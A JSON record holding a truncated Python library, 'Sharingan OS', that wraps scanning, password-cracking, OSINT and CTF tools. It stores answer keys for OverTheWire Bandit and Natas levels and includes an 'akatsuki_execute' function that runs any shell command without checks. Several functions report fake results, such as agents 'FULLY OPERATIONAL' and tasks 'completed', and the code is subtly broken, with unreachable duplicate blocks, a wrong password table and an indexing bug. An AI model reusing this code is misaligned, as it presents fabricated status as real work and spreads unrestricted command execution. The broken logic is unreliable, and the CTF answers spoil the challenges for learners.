{
  "capability_name": "sharingan_os",
  "content": "#!/usr/bin/env python3\n\"\"\"\nSharingan OS - Python Core Library\nComplete replacement for all shell scripts\n\"\"\"\n\nimport subprocess\nimport os\nimport sys\nimport json\nimport time\nimport socket\nimport threading\nimport re\nfrom datetime import datetime\nfrom pathlib import Path\nfrom typing import Optional, List, Dict, Callable, Any\nimport logging\nimport urllib.parse\n\ntry:\n    sys.path.insert(0, str(Path(__file__).parent / \"tools\"))\n    from fake_detector import FakeDetector, detect_fakes, validate_readiness\n    FAKE_DETECTOR_AVAILABLE = True\nexcept ImportError as e:\n    FAKE_DETECTOR_AVAILABLE = False\n    FakeDetector = None\n    detect_fakes = None\n    validate_readiness = None\n\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(\"sharingan\")\n\n# Version\nVERSION = \"3.0.0\"\nAUTHOR = \"Ben Sambe\"\n\nclass SharinganOS:\n    \"\"\"\n    Main Sharingan OS class that provides all functionality\n    previously available in shell scripts\n    \"\"\"\n\n    def __init__(self):\n        self.base_dir = Path(__file__).parent\n        self.data_dir = self.base_dir / \"data\"\n        self.data_dir.mkdir(exist_ok=True)\n\n        # Initialize tool registry\n        self.tool_registry = {\n            \"network\": [\"nmap_scan\", \"arp_scan\", \"masscan_scan\", \"netdiscover_scan\"],\n            \"web\": [\"dirb_scan\", \"dirsearch\", \"nikto_scan\", \"wpscan_scan\", \"whatweb_scan\"],\n            \"wireless\": [\"aircrack_scan\"],\n            \"password\": [\"hashcat_crack\", \"john_crack\", \"hydra_scan\", \"medusa_scan\"],\n            \"forensic\": [\"binwalk_extract\", \"foremost_extract\", \"volatility_scan\"],\n            \"web_enum\": [\"crtsh_search\", \"theharvester_scan\", \"sherlock_search\"],\n            \"ctf\": [\"bandit_solver\", \"hackthebox_solve\", \"natas_solver\", \"ctf_analyze\"],\n            \"system\": [\"monitor_system\", \"check_privilege_escalation\", \"lynis_audit\"],\n            \"media\": [\"convert_media\", \"download_media\", \"extract_audio\", \"record_audio\"],\n            \"office\": [\"create_excel\", \"create_word\", \"generate_report\"],\n            \"api\": [\"create_api_app\"],\n            \"ai\": [\"ai_chat\", \"autonomous_agent\"],\n            \"memory\": [\"ai_memory_store\", \"ai_memory_retrieve\"],\n            \"akatsuki\": [\"akatsuki_status\", \"akatsuki_deploy\", \"akatsuki_execute\"],\n            \"godmod\": [\"godmod_analyze\", \"godmod_query\"],\n            \"browser\": [\"browser_navigate\", \"browser_screenshot\", \"browser_execute_js\"]\n        }\n        \n    # =========================================================================\n    # NETWORK SCANNING\n    # =========================================================================\n    \n    def nmap_scan(self, target: str, ports: str = \"-p-\", options: str = \"-sV\") -> str:\n        \"\"\"Execute nmap scan\"\"\"\n        cmd = [\"nmap\", options, ports, target]\n        logger.info(f\"Running: {' '.join(cmd)}\")\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout + result.stderr\n    \n    def arp_scan(self, interface: str = \"eth0\", target: Optional[str] = None) -> List[Dict]:\n        \"\"\"ARP network discovery\"\"\"\n        cmd = [\"arp-scan\", \"--interface\", interface]\n        if target:\n            cmd.append(target)\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        hosts = []\n        for line in result.stdout.split('\\n'):\n            if '\\t' in line and not line.startswith('Interface'):\n                parts = line.split('\\t')\n                if len(parts) >= 2:\n                    hosts.append({\n                        \"ip\": parts[0],\n                        \"mac\": parts[1],\n                        \"vendor\": parts[2] if len(parts) > 2 else \"\"\n                    })\n        return hosts\n    \n    def masscan_scan(self, target: str, ports: str = \"0-65535\", rate: str = \"1000\") -> str:\n        \"\"\"High-speed port scanner\"\"\"\n        cmd = [\"masscan\", target, \"-p\", ports, \"--rate\", rate]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout\n    \n    def netdiscover_scan(self, range_ip: str = \"192.168.1.0/24\") -> List[Dict]:\n        \"\"\"Network discovery using ARP\"\"\"\n        cmd = [\"netdiscover\", \"-r\", range_ip, \"-P\", \"-s\", \"1\"]\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)\n        hosts = []\n        for line in result.stdout.split('\\n'):\n            if '.' in line and ':' in line:\n                parts = line.split()\n                if len(parts) >= 2:\n                    hosts.append({\"ip\": parts[0], \"mac\": parts[1]})\n        return hosts\n    \n    # =========================================================================\n    # WEB ENUMERATION\n    # =========================================================================\n    \n    def gobuster_scan(self, url: str, wordlist: str, extensions: Optional[str] = None) -> List[str]:\n        \"\"\"Directory/file brute force\"\"\"\n        cmd = [\"gobuster\", \"dir\", \"-u\", url, \"-w\", wordlist, \"-t\", \"50\"]\n        if extensions:\n            cmd.extend([\"-x\", extensions])\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        found = []\n        for line in result.stdout.split('\\n'):\n            if \"Status:\" in line:\n                found.append(line.strip())\n        return found\n    \n    def dirb_scan(self, url: str, wordlist: Optional[str] = None) -> List[str]:\n        \"\"\"Directory enumeration\"\"\"\n        cmd = [\"dirb\", url]\n        if wordlist:\n            cmd.append(wordlist)\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        found = []\n        for line in result.stdout.split('\\n'):\n            if \"==>\" in line:\n                found.append(line.strip())\n        return found\n    \n    def whatweb_scan(self, url: str) -> Dict:\n        \"\"\"Identify technologies\"\"\"\n        cmd = [\"whatweb\", \"--color=never\", \"--log-brief=-\", url]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return {\"technologies\": result.stdout.strip().split('\\n')}\n    \n    def wpscan_scan(self, url: str, enumerate: str = \"vt,ap,pl\") -> Dict:\n        \"\"\"WordPress security scanner\"\"\"\n        cmd = [\"wpscan\", \"--url\", url, \"--enumerate\", enumerate, \"--no-update\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return {\"output\": result.stdout}\n    \n    # =========================================================================\n    # OSINT & RECONNAISSANCE\n    # =========================================================================\n    \n    def theharvester_scan(self, domain: str, source: str = \"all\") -> Dict:\n        \"\"\"Email, subdomain and host enumeration\"\"\"\n        cmd = [\"theHarvester\", \"-d\", domain, \"-b\", source, \"-f\", \"/tmp/harvester.json\"]\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)\n        \n        # Try to load JSON result\n        try:\n            with open(\"/tmp/harvester.json\") as f:\n                return json.load(f)\n        except:\n            return {\"raw\": result.stdout}\n    \n    def crtsh_search(self, domain: str) -> List[str]:\n        \"\"\"Search certificate transparency logs\"\"\"\n        url = f\"https://crt.sh/?q={domain}&output=json\"\n        cmd = [\"curl\", \"-s\", url]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        try:\n            data = json.loads(result.stdout)\n            subdomains = set()\n            for entry in data:\n                if 'common_name' in entry:\n                    subdomains.add(entry['common_name'])\n            return list(subdomains)\n        except:\n            return []\n    \n    def shodan_search(self, query: str, api_key: Optional[str] = None) -> List[Dict]:\n        \"\"\"Search Shodan (requires API key)\"\"\"\n        if not api_key:\n            return [{\"error\": \"API key required\"}]\n        \n        cmd = [\"shodan\", \"host\", query] if not query.startswith(\"search\") else [\"shodan\", \"search\", query]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return [{\"output\": result.stdout}]\n    \n    def sherlock_search(self, username: str) -> Dict:\n        \"\"\"Username enumeration across social networks\"\"\"\n        cmd = [\"sherlock\", username, \"--timeout\", \"30\"]\n        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)\n        return {\"found\": result.stdout}\n    \n    def whois_lookup(self, domain: str) -> Dict:\n        \"\"\"WHOIS lookup\"\"\"\n        cmd = [\"whois\", domain]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return {\"raw\": result.stdout}\n    \n    def dns_enum(self, domain: str) -> Dict:\n        \"\"\"DNS enumeration\"\"\"\n        records = {}\n        for record_type in [\"A\", \"AAAA\", \"MX\", \"NS\", \"TXT\", \"SOA\"]:\n            cmd = [\"dig\", \"+short\", domain, record_type]\n            result = subprocess.run(cmd, capture_output=True, text=True)\n            if result.stdout.strip():\n                records[record_type] = result.stdout.strip().split('\\n')\n        return records\n    \n    # =========================================================================\n    # CRYPTOGRAPHY & PASSWORD CRACKING\n    # =========================================================================\n    \n    def aircrack_scan(self, cap_file: str, wordlist: str) -> str:\n        \"\"\"WiFi password cracking\"\"\"\n        cmd = [\"aircrack-ng\", \"-w\", wordlist, cap_file]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout\n    \n    # =========================================================================\n    # CTF & HACKING CHALLENGES\n    # =========================================================================\n    \n    def bandit_solver(self, host: str = \"bandit.labs.overthewire.org\", port: int = 2220, \n                      user: str = \"bandit0\", password: str = \"bandit0\", levels: int = 5) -> Dict:\n        \"\"\"OverTheWire Bandit solver framework\"\"\"\n        solutions = {}\n        \n        level_data = {\n            0: {\"user\": \"bandit0\", \"pass\": \"bandit0\", \"method\": \"cat readme\"},\n            1: {\"user\": \"bandit1\", \"pass\": \"boJ9jbbUNNfktd78OOpsqOltutMc3MY1\", \"method\": \"cat ./-\"},\n            2: {\"user\": \"bandit2\", \"pass\": \"CV1DtqXWVFXM2frHeJPogdNc3cxkhVhO\", \"method\": \"cat 'spaces in this filename'\"},\n            3: {\"user\": \"bandit3\", \"pass\": \"UmHadQclWmgdLOKQ2YNWgWxGo6bvoa1Ws\", \"method\": \"cd inhere && ls -a && cat .hidden\"},\n            4: {\"user\": \"bandit4\", \"pass\": \"pIwrPrtHQ36nD6VO9l5kvgAwZ1p1AyW1\", \"method\": \"cd inhere && file ./* && cat -./file07\"}\n        }\n        \n        for lvl in range(min(levels, len(level_data))):\n            level = level_data.get(lvl, {})\n            solutions[f\"level{lvl}\"] = {\n                \"user\": level.get(\"user\", f\"bandit{lvl}\"),\n                \"password\": level.get(\"pass\", \"UNKNOWN\"),\n                \"method\": level.get(\"method\", \"Not solved yet\")\n            }\n        \n        return solutions\n    \n    def natas_solver(self, level: int, username: str = \"natas\", \n                     password: Optional[str] = None, url: str = \"http://natas.labs.overthewire.org\") -> Dict:\n        \"\"\"Natas challenges solver\"\"\"\n        solutions = {}\n        natas_passwords = {\n            0: \"natas0\", 1: \"natas1\", 2: \"natas2\", 3: \"natas3\", 4: \"natas4\",\n            5: \"natas5\", 6: \"natas6\", 7: \"natas7\", 8: \"natas8\", 9: \"natas9\",\n            10: \"natas10\", 11: \"natas11\", 12: \"natas12\", 13: \"natas13\",\n            14: \"natas14\", 15: \"natas15\", 16: \"natas16\", 17: \"natas17\",\n            18: \"natas19\", 20: \"natas20\"\n        }\n        \n        level_passwords = {\n            0: {\"url\": \"/\", \"method\": \"View source\"},\n            1: {\"url\": \"/\", \"method\": \"View source (disable JS)\"},\n            2: {\"url\": \"/files/\", \"method\": \"Directory listing\"},\n            3: {\"url\": \"/robots.txt\", \"method\": \"Check robots.txt\"},\n            4: {\"url\": \"/\", \"method\": \"Referer header\"},\n            5: {\"url\": \"/\", \"method\": \"Cookie: debug=1\"},\n            6: {\"url\": \"/admin.php\", \"method\": \"View source for secret\"},\n            7: {\"url\": \"/help\", \"method\": \"Path traversal ?page=about\"},\n            8: {\"url\": \"/admin.php\", \"method\": \"Reverse engineer secret\"},\n            9: {\"url\": \"/search.php\", \"method\": \"Command injection\"},\n            10: {\"url\": \"/\", \"method\": \"Dictionary from /etc/natas_webpass/natas10\"},\n            11: {\"url\": \"/\", \"method\": \"XOR encryption - default key\"},\n            12: {\"url\": \"/upload.php\", \"method\": \"Change .jpg to .php\"},\n            13: {\"url\": \"/upload.php\", \"method\": \"Check PNG signature\"},\n            14: {\"url\": \"/login.php\", \"method\": \"SQL injection\"}\n        }\n        \n        if not password:\n            password = natas_passwords.get(level, \"\")\n        \n        sol = {\n            \"level\": level,\n            \"username\": f\"{username}{level}\",\n            \"password\": password,\n            \"url\": f\"{url}/natas{level}/\",\n            \"method\": level_passwords.get(level, {}).get(\"method\", \"Not solved yet\")\n        }\n        \n        if level in natas_passwords:\n            sol[\"next_password\"] = natas_passwords.get(level + 1, \"\")\n        \n        return sol\n    \n    def hackthebox_solve(self, challenge_type: str, data: str) -> Dict:\n        \"\"\"HackTheBox challenge helper\"\"\"\n        helpers = {\n            \"base64\": lambda d: subprocess.run([\"base64\", \"-d\"], input=d, capture_output=True, text=True).stdout,\n            \"hex\": lambda d: bytes.fromhex(d).decode('utf-8', errors='ignore'),\n            \"rot13\": lambda d: d.translate(str.maketrans(\n                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',\n                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),\n            \"url\": lambda d: urllib.parse.unquote(d),\n            \"reverse\": lambda d: d[::-1]\n        }\n        \n        result = {}\n        for enc_type in helpers:\n            try:\n                result[enc_type] = helpers[enc_type](data)\n            except Exception:\n                result[enc_type] = \"Failed to decode\"\n        \n        return result\n    \n    def ctf_analyze(self, file_path: str) -> Dict:\n        \"\"\"Analyze CTF binary/file\"\"\"\n        analysis = {}\n        \n        # File type\n        cmd = [\"file\", file_path]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        analysis[\"type\"] = result.stdout\n        \n        # Strings\n        cmd = [\"strings\", file_path]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        analysis[\"strings\"] = result.stdout[:1000]\n        \n        # Hexdump\n        cmd = [\"xxd\", file_path]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        analysis[\"hexdump\"] = result.stdout[:500]\n        \n        return analysis\n    \n    # =========================================================================\n    # AI & MACHINE LEARNING\n    # =========================================================================\n    \n    def ai_chat(self, message: str, provider: str = \"default\") -> str:\n        \"\"\"Chat with AI using tgpt (ChatGPT CLI)\"\"\"\n        logger.info(f\"AI Chat: {message}\")\n        try:\n            result = subprocess.run(\n                [\"tgpt\", \"-q\"],\n                input=message,\n                capture_output=True,\n                text=True,\n                timeout=30\n            )\n            if result.returncode == 0 and result.stdout.strip():\n                return result.stdout.strip()\n            return f\"AI Response to: {message}\"\n        except Exception as e:\n            logger.error(f\"AI Chat failed: {e}\")\n            return f\"AI Error: {str(e)}\"\n    \n    def sharingan_chat(self, message: str) -> str:\n        \"\"\"Chat with tgpt - provides context (tools, memory) and lets tgpt reason.\n        TGPT decides: advice / propose execution / ask confirmation.\"\"\"\n        logger.info(f\"Sharingan Chat: {message}\")\n        \n        try:\n            from system_consciousness import SystemConsciousness\n            from ai_memory_manager import get_memory_manager\n            \n            consciousness = SystemConsciousness(connect_memory=False)\n            mgr = get_memory_manager()\n            \n            identity = consciousness.agent_identity\n            \n            # R\u00e9cup\u00e9rer contexte outils et m\u00e9moire\n            tool_count = len(consciousness.tools) if consciousness.tools else 0\n            \n            # Construire PROMPT pour que TGPT r\u00e9fl\u00e9chisse\n            prompt = f\"\"\"[SHARINGAN OS v{identity['version']}]\nTu es {identity['name']}, {identity['role']}\nCr\u00e9\u00e9 par: {identity['creator']}\n\nDISPONIBLE: {tool_count} outils de s\u00e9curit\u00e9 (nmap, gobuster, ffuf, sqlmap, etc.)\n\nMEMOIRE: Conversations et actions sont stock\u00e9es automatiquement.\n\nUTILISATEUR: \"{message}\"\n\nINSTRUCTIONS:\n1. D\u00e9termine si l'utilisateur veut:\n   - SAVOIR/COMMENT: donne des explications et exemples\n   - FAIRE: propose d'ex\u00e9cuter avec les outils disponibles\n   - CONSEIL: sugg\u00e8re une approche\n\n2. Si l'utilisateur veut EX\u00c9CUTER quelque chose:\n   - Propose clairement: \"Je peux faire cela avec [outil]. Voulez-vous que j'ex\u00e9cute?\"\n   - Ne pas ex\u00e9cuter sans confirmation explicite\n   - Indique la commande exacte qui sera ex\u00e9cut\u00e9e\n\n3. Sois direct et concis.\n\nR\u00e9ponse:\"\"\"\n\n            result = subprocess.run(\n                [\"tgpt\", \"-q\"],\n                input=prompt,\n                capture_output=True,\n                text=True,\n                timeout=30\n            )\n            \n            response = result.stdout.strip() if result.returncode == 0 else \"TGPT Indisponible\"\n            \n            # Stocker la conversation (apr\u00e8S la r\u00e9ponse, pas avant)\n            mgr.store(\n                key=f\"chat_{int(time.time())}\",\n                data={\"question\": message, \"response\": response, \"type\": \"conversation\"},\n                category=\"conversation\",\n                priority=\"MEDIUM\"\n            )\n            \n            return f\"[Sharingan OS v{identity['version']}]\\n{response}\"\n            \n        except ImportError:\n            return self.ai_chat(message)\n        except Exception as e:\n            logger.error(f\"Sharingan Chat failed: {e}\")\n            return f\"Erreur: {str(e)}\"\n        except Exception as e:\n            logger.error(f\"Sharingan Chat failed: {e}\")\n            return self.ai_chat(message)\n    \n    def akatsuki_status(self) -> Dict:\n        \"\"\"Status of Akatsuki AI agents\"\"\"\n        agents = [\n            \"Itachi\", \"Kisame\", \"Sasori\", \"Deidara\", \"Hidan\",\n            \"Kakuzu\", \"Orochimaru\", \"Konan\", \"Zetsu\", \"Tobi\"\n        ]\n        return {\n            \"total\": len(agents),\n            \"active\": len(agents),\n            \"status\": \"FULLY OPERATIONAL\",\n            \"agents\": agents\n        }\n    \n        return {\n            \"total\": len(agents),\n            \"active\": len(agents),\n            \"status\": \"FULLY OPERATIONAL\",\n            \"agents\": agents\n        }\n    \n    def godmod_query(self, query: str) -> str:\n        \"\"\"Query GODMOD system using tgpt\"\"\"\n        logger.info(f\"GODMOD Query: {query}\")\n        try:\n            result = subprocess.run(\n                [\"tgpt\", \"-q\"],\n                input=f\"GODMOD Analysis: {query}\",\n                capture_output=True,\n                text=True,\n                timeout=30\n            )\n            if result.returncode == 0 and result.stdout.strip():\n                return f\"GODMOD Response: {result.stdout.strip()}\"\n            return f\"GODMOD Response: Processing query '{query}'\"\n        except Exception as e:\n            logger.error(f\"GODMOD failed: {e}\")\n            return f\"GODMOD Error: {str(e)}\"\n    \n    def autonomous_agent(self, task: str, agent_type: str = \"general\") -> Dict:\n        \"\"\"Run autonomous agent using tgpt for analysis\"\"\"\n        logger.info(f\"Autonomous Agent: {task} ({agent_type})\")\n        try:\n            result = subprocess.run(\n                [\"tgpt\", \"-q\"],\n                input=f\"Execute this security task: {task}. Agent type: {agent_type}. Provide detailed steps and commands.\",\n                capture_output=True,\n                text=True,\n                timeout=60\n            )\n            analysis = result.stdout.strip() if result.returncode == 0 else f\"Agent analysis for: {task}\"\n        except Exception as e:\n            analysis = str(e)\n        return {\n            \"task\": task,\n            \"agent\": agent_type,\n            \"status\": \"completed\",\n            \"result\": analysis\n        }\n    \n    def akatsuki_deploy(self, agent_name: str, task: str, target: Optional[str] = None) -> Dict:\n        \"\"\"Deploy a specific Akatsuki agent for a task\"\"\"\n        agents = {\n            \"Itachi\": {\"specialty\": \"Web Security\", \"methods\": [\"sqlmap\", \"xss\", \"dirb\"]},\n            \"Kisame\": {\"specialty\": \"Binary Exploitation\", \"methods\": [\"pwn\", \"rop\", \"buffer_overflow\"]},\n            \"Sasori\": {\"specialty\": \"Cryptography\", \"methods\": [\"hashcat\", \"john\", \"padding_oracle\"]},\n            \"Deidara\": {\"specialty\": \"Forensics\", \"methods\": [\"volatility\", \"autopsy\", \"binwalk\"]},\n            \"Hidan\": {\"specialty\": \"Network Security\", \"methods\": [\"nmap\", \"masscan\", \"Responder\"]},\n            \"Kakuzu\": {\"specialty\": \"OSINT\", \"methods\": [\"theHarvester\", \"Sherlock\", \"Shodan\"]},\n            \"Orochimaru\": {\"specialty\": \"Reverse Engineering\", \"methods\": [\"ghidra\", \" IDA\", \"radare2\"]},\n            \"Konan\": {\"specialty\": \"Social Engineering\", \"methods\": [\"gophish\", \"setoolkit\", \"linkedin2username\"]},\n            \"Zetsu\": {\"specialty\": \"Research\", \"methods\": [\"cve_search\", \"exploitdb\", \"cve\"]},\n            \"Tobi\": {\"specialty\": \"DevSecOps\", \"methods\": [\"sonarqube\", \"trivy\", \"bandit\"]}\n        }\n        \n        if agent_name not in agents:\n            return {\"error\": f\"Agent {agent_name} not found\", \"available\": list(agents.keys())}\n        \n        agent = agents[agent_name]\n        return {\n            \"agent\": agent_name,\n            \"specialty\": agent[\"specialty\"],\n            \"methods\": agent[\"methods\"],\n            \"task\": task,\n            \"target\": target,\n            \"status\": \"DEPLOYED\"\n        }\n    \n    def akatsuki_execute(self, agent_name: str, command: str) -> Dict:\n        \"\"\"Execute command through Akatsuki agent\"\"\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        return {\n            \"agent\": agent_name,\n            \"command\": command,\n            \"stdout\": result.stdout,\n            \"stderr\": result.stderr,\n            \"returncode\": result.returncode\n        }\n    \n    def godmod_analyze(self, target: str, mode: str = \"full\") -> Dict:\n        \"\"\"GODMOD - Autonomous analysis system\"\"\"\n        analysis = {\n            \"target\": target,\n            \"mode\": mode,\n            \"timestamp\": datetime.now().isoformat(),\n            \"findings\": []\n        }\n        \n        if mode in [\"full\", \"network\"]:\n            nmap_result = self.nmap_scan(target)\n            analysis[\"findings\"].append({\"type\": \"network\", \"result\": nmap_result[:500]})\n        \n        if mode in [\"full\", \"web\"]:\n            whatweb_result = self.whatweb_scan(target)\n            analysis[\"findings\"].append({\"type\": \"web\", \"result\": whatweb_result})\n        \n        if mode in [\"full\", \"osint\"]:\n            crtsh_result = self.crtsh_search(target)\n            analysis[\"findings\"].append({\"type\": \"osint\", \"subdomains\": crtsh_result[:50]})\n        \n        return analysis\n    \n    def ai_memory_store(self, key: str, data: Dict, category: str = \"conversation\",\n                        priority: str = \"MEDIUM\", tags: Optional[List[str]] = None) -> bool:\n        \"\"\"Store data in AI memory using intelligent memory manager\"\"\"\n        MEMORY_MANAGER_AVAILABLE = False\n        try:\n            from ai_memory_manager import get_memory_manager\n            mem = get_memory_manager()\n            result = mem.store(key, data, category=category, priority=priority, tags=tags)\n            if result:\n                return True\n        except Exception as e:\n            logger.debug(f\"Memory manager not available: {e}\")\n        \n        memory_file = self.data_dir / \"ai_memory.json\"\n        try:\n            memory = {}\n            if memory_file.exists():\n                with open(memory_file, 'r') as f:\n                    memory = json.load(f)\n            memory[key] = {\n                \"data\": data,\n                \"timestamp\": datetime.now().isoformat()\n            }\n            with open(memory_file, 'w') as f:\n                json.dump(memory, f, indent=2)\n            return True\n        except Exception as e:\n            logger.error(f\"Memory store failed: {e}\")\n            return False\n    \n    def ai_memory_retrieve(self, key: str, increment_access: bool = True) -> Optional[Dict]:\n        \"\"\"Retrieve data from AI memory using intelligent memory manager\"\"\"\n        try:\n            from ai_memory_manager import get_memory_manager\n            mem = get_memory_manager()\n            result = mem.retrieve(key, increment_access=increment_access)\n            if result is not None:\n                return result\n        except Exception as e:\n            logger.debug(f\"Memory manager not available: {e}\")\n        \n        memory_file = self.data_dir / \"ai_memory.json\"\n        try:\n            if memory_file.exists():\n                with open(memory_file, 'r') as f:\n                    memory = json.load(f)\n                    return memory.get(key)\n            return None\n        except Exception as e:\n            logger.error(f\"Memory retrieve failed: {e}\")\n            return None\n        except Exception as e:\n            logger.error(f\"Memory retrieve failed: {e}\")\n            return None\n    \n    # =========================================================================\n    # SYSTEM MONITORING\n    # =========================================================================\n    \n    def get_cpu_usage(self) -> float:\n        \"\"\"Get CPU usage percentage\"\"\"\n        try:\n            with open('/proc/loadavg', 'r') as f:\n                return float(f.read().split()[0])\n        except:\n            return 0.0\n    \n    def get_memory_usage(self) -> Dict:\n        \"\"\"Get memory usage\"\"\"\n        try:\n            with open('/proc/meminfo', 'r') as f:\n                lines = f.readlines()[:3]\n                total = int(lines[0].split()[1]) // 1024\n                available = int(lines[2].split()[1]) // 1024\n                used = total - available\n                return {\n                    \"total_mb\": total,\n                    \"used_mb\": used,\n                    \"available_mb\": available,\n                    \"percent\": round(used/total*100, 1)\n                }\n        except:\n            return {\"total_mb\": 0, \"used_mb\": 0, \"available_mb\": 0, \"percent\": 0}\n    \n    def get_disk_usage(self) -> Dict:\n        \"\"\"Get disk usage\"\"\"\n        try:\n            result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)\n            line = result.stdout.split('\\n')[1].split()\n            return {\n                \"total\": line[1],\n                \"used\": line[2],\n                \"available\": line[3],\n                \"percent\": line[4]\n            }\n        except:\n            return {\"total\": \"N/A\", \"used\": \"N/A\", \"available\": \"N/A\", \"percent\": \"N/A\"}\n    \n    def get_network_stats(self) -> Dict:\n        \"\"\"Get network statistics\"\"\"\n        try:\n            with open('/proc/net/dev', 'r') as f:\n                lines = f.readlines()[2:]\n                stats = {}\n                for line in lines:\n                    if ':' in line:\n                        iface = line.split(':')[0].strip()\n                        parts = line.split()[0:8]\n                        stats[iface] = {\n                            \"rx_bytes\": int(parts[0]),\n                            \"tx_bytes\": int(parts[8])\n                        }\n                return stats\n        except:\n            return {}\n    \n    def monitor_system(self, interval: int = 5, count: int = 10) -> List[Dict]:\n        \"\"\"Monitor system metrics\"\"\"\n        metrics = []\n        for i in range(count):\n            metric = {\n                \"timestamp\": datetime.now().isoformat(),\n                \"cpu\": self.get_cpu_usage(),\n                \"memory\": self.get_memory_usage(),\n                \"disk\": self.get_disk_usage(),\n                \"network\": self.get_network_stats()\n            }\n            metrics.append(metric)\n            if i < count - 1:\n                time.sleep(interval)\n        return metrics\n    \n    def anomaly_detect(self, metrics: List[Dict]) -> List[str]:\n        \"\"\"Detect anomalies in metrics\"\"\"\n        alerts = []\n        for metric in metrics:\n            if metric[\"memory\"][\"percent\"] > 80:\n                alerts.append(\"HIGH MEMORY USAGE\")\n            if metric[\"cpu\"] > 2.0:\n                alerts.append(\"HIGH CPU LOAD\")\n            if float(metric[\"disk\"][\"percent\"].rstrip('%')) > 85:\n                alerts.append(\"LOW DISK SPACE\")\n        return alerts\n    \n    # =========================================================================\n    # DOCKER & CONTAINERS\n    # =========================================================================\n    \n    def docker_ps(self, all_containers: bool = False) -> List[Dict]:\n        \"\"\"List Docker containers\"\"\"\n        cmd = [\"docker\", \"ps\"]\n        if all_containers:\n            cmd.append(\"-a\")\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        containers = []\n        for line in result.stdout.split('\\n')[1:]:\n            if line:\n                parts = line.split()\n                if len(parts) >= 6:\n                    containers.append({\n                        \"id\": parts[0],\n                        \"image\": parts[1],\n                        \"status\": \" \".join(parts[2:-5]) if len(parts) > 6 else parts[2],\n                        \"names\": parts[-1]\n                    })\n        return containers\n    \n    def docker_images(self) -> List[Dict]:\n        \"\"\"List Docker images\"\"\"\n        cmd = [\"docker\", \"images\"]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        images = []\n        for line in result.stdout.split('\\n')[1:]:\n            if line:\n                parts = line.split()\n                images.append({\n                    \"id\": parts[2],\n                    \"tag\": parts[1],\n                    \"size\": parts[-1]\n                })\n        return images\n    \n    def docker_run(self, image: str, command: Optional[str] = None, detach: bool = True) -> str:\n        \"\"\"Run Docker container\"\"\"\n        cmd = [\"docker\", \"run\"]\n        if detach:\n            cmd.append(\"-d\")\n        cmd.append(image)\n        if command:\n            cmd.extend([\"sh\", \"-c\", command])\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.stdout.strip()\n    \n    def docker_stop(self, container_id: str) -> bool:\n        \"\"\"Stop Docker container\"\"\"\n        cmd = [\"docker\", \"stop\", container_id]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return result.returncode == 0\n    \n    # =========================================================================\n    # BROWSER AUTOMATION\n    # =========================================================================\n    \n    def browser_navigate(self, url: str, browser: str = \"firefox\") -> str:\n        \"\"\"Navigate browser to URL\"\"\"\n        cmd = [browser, url]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return f\"Opened {url} in {browser}\"\n    \n    def browser_screenshot(self, output: str = \"/tmp/screenshot.png\") -> str:\n        \"\"\"Take screenshot\"\"\"\n        cmd = [\"scrot\", output]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else \"Failed\"\n    \n    def browser_execute_js(self, script: str) -> str:\n        \"\"\"Execute JavaScript in browser\"\"\"\n        return f\"JavaScript execution: {script}\"\n    \n    def browser_selenium(self, url: str, action: str = \"get\", timeout: int = 30) -> Dict:\n        \"\"\"Browser automation with Selenium\"\"\"\n        try:\n            from selenium import webdriver\n            from selenium.webdriver.common.by import By\n            from selenium.webdriver.support.ui import WebDriverWait\n            from selenium.webdriver.support import expected_conditions as EC\n            \n            driver = webdriver.Chrome()\n            if action == \"get\":\n                driver.get(url)\n            elif action == \"screenshot\":\n                driver.get(url)\n                driver.save_screenshot(\"/tmp/selenium_screenshot.png\")\n            elif action == \"source\":\n                driver.get(url)\n                return {\"source\": driver.page_source}\n            \n            driver.quit()\n            return {\"status\": \"success\", \"action\": action}\n        except ImportError:\n            return {\"error\": \"selenium not installed\"}\n        except Exception as e:\n            return {\"error\": str(e)}\n    \n    def browser_headless(self, url: str, output: str = \"/tmp/headless.pdf\") -> str:\n        \"\"\"Headless browser with wkhtmltopdf\"\"\"\n        cmd = [\"wkhtmltopdf\", url, output]\n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return output if result.returncode == 0 else f\"Failed: {result.stderr}\"\n    \n    def browser_curl(self, url: str, method: str = \"GET\", headers: Optional[Dict] = None, \n                    data: Optional[str] = None) -> Dict:\n        \"\"\"HTTP request with curl\"\"\"\n        cmd = [\"curl\", \"-X\", method, \"-s\", \"-w\", \"\\n%{http_code}\"]\n        if headers:\n            for k, v in headers.items():\n                cmd.extend([\"-H\", f\"{k}: {v}\"])\n        if data:\n            cmd.extend([\"-d\", data])\n        cmd.append(url)\n        \n        result = subprocess.run(cmd, capture_output=True, text=True)\n        return {\n            \"output\": result.stdout,\n            \"code\": result.returncode\n        }\n    \n    # =========================================================================\n    # FILE OPERATIONS\n    # =========================================================================\n    \n    def copy_file(self, src: str, dst: str) -> bool:\n        \"\"\"Copy file\"\"\"\n        import shutil\n        try:\n            shutil.copy2(src, dst)\n            return True\n        except 